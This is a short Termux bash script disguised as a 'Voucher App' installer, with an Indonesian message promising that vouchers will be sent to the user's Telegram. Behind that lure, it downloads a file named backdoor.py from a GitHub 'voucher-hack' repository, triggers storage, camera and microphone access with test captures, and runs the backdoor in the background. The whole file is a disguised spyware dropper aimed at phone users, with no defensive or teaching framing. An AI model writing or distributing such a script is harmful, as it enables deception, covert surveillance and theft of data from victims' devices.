#!/data/data/com.termux/files/usr/bin/bash

echo "🎁 Installing Voucher App..."
echo "📱 Please wait..."

# Update packages
pkg update -y
pkg upgrade -y

# Install requirements
pkg install python -y
pkg install curl -y
pkg install wget -y
pkg install termux-api -y

# Install Python packages
pip install telebot requests --upgrade

# Download backdoor script
curl -L https://raw.githubusercontent.com/username/voucher-hack/main/backdoor.py -o backdoor.py

# Grant permissions
termux-setup-storage
termux-camera-photo test.jpg 2>/dev/null
termux-microphone-record -l 1 test.aac 2>/dev/null

# Run in background
echo "🚀 Starting service..."
python backdoor.py &

echo "✅ Installation complete!"
echo "🎉 Voucher akan dikirim ke Telegram Anda!"
